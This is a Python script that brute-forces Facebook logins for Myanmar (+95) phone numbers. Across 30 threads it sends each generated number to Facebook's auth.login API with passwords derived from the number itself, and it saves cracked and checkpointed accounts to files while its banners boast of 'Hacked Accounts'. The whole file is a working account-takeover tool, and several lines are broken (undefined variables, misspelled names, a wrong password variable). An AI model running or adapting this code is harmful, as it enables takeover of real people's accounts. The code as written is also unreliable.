#Honestly This code is not Mine Someone write it in python2 and i just convert it to python3 and add some feature for myanmar 

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,getpass
from colorama import Fore, Back, Style
os.system('rm -rf .txt')
n1=sys.argv[2]
n2=sys.argv[3]
for n in range(int(n1),int(n2)):
	opn = open(".txt",'a')
	opn.write(str(n)+'\n')

try:
	import requests
except ImportError:
	os.system('pip3 install requests')

try:
	import mechanize
except ImportError:
	os.system('pip3 install machanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser 

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print("[!] Exit")
	os.sys.exit()

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def t():
	time.sleep(1)
def cb():
	os.system('clear')

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	action()

def action():
	try:

		ph_prefix= sys.argv[1]
		country_code = "+95"
		idlist = ('.txt')
		for line in open(idlist,'r').readlines():
			id.append(line.strip())
	except IOError:
			print("[!] File Not Found")
			menu()

	xxx = str(len(id))
	psb('[✓] Total Number '+xxx)
	time.sleep(0.5)
	psb("[✓] Please Wait, Process is Running ....")
	time.sleep(0.5)
	psb("[✓] All of Your Hacked Accounts are Available For Login After 72Hrs")
	psb("[✓] To Stop This Attack Press CTRL THEN Press Z")
	time.sleep(0.5)


	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+country_code+ph_prefix+user+ '&locale=en_US&password=' +pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print(Fore.Green+"[Login After 24HR]"+Style.RESET_ALL+str(country_code)+str(ph_prefix)+user+' | '+pass1+'\n'+'\n')
				okb = open("save/successful.txt",'a')
				okb.write(country_code+ph_prefix+user+ ' | '+pass1+'\n')
				oks.close()
				oks.append(ph_prefix+use+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print("[Login After 72hr] "+ country_code + ph_prefix + user + ' | ' + pass1 + '\n')
					cps = open("save/checkpoint.txt","a")
					cps.write(country_code+ph_prefix+user+' | '+pass1+'\n')
					cps.close()
					cpb.append(ph_prefix+user+pass1)
				else:
					pass2="0"+str(ph_prefix)+str(user)
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+country_code+ph_prefix+user+'&locale=en_US&password='+pass2+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
					q = json.load(data)
					if 'access_token' in q:
						print(Fore.Green+"[Login After 24HR]"+Style.RESET_ALL+str(country_code)+str(ph_prefix)+user+' | '+pass2+'\n'+'\n')
						okb = open('save/successful.txt','a')
						okb.write(k+c+user+' | '+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:
						if 'www.facebook.com' in q['error_msg']:
							print("[Login After 72HR]"+country_code+ph_prefix+user+' | '+  pass2+'\n')
							cps = open('save/checkpoint.txt','a')
							cps = write(country_code+ph_prefix+user+' | '+pass2+'\n')
							cps.close()
							cpb.append()
						else:
							pass3 = "0"+str(ph_prefix)+str(user)
							pass3 = pass3[2:]
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+country_code+ph_prefix+user+'&locale=en_US&password='+pass2+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
							q = json.load(data)
							if 'access_token' in q:
								print(Fore.Green+"[Login After 24HR]"+Style.RESET_ALL+str(country_code)+str(ph_prefix)+user+' | '+pass2+'\n'+'\n')
								okb = open('save/successful.txt','a')
								okb.write(country_code+ph_prefix+user+' | '+pass3+'\n')
								okb.close()
								oks.append(ph_prefix+user+pass3)
							else:
								if 'www.facebook.com' in q['error_msg']:
									print("[Login After 72HR]"+country_code+ph_prefix+user+' | '+  pass3+'\n')
									cps = open('save/checkpoint.txt','a')
									cps.close()
									cbp.append(ph_prefix+user+pass3)
								else:
									print(pass3)
		except:
			pass
	p = ThreadPool(30)
	p.map(main,id)
	print(50*'_')
	print('[✓] Process Has Been Completed ......')
	print('[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb)))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	input("[Press Enter To Go Back]")
menu()


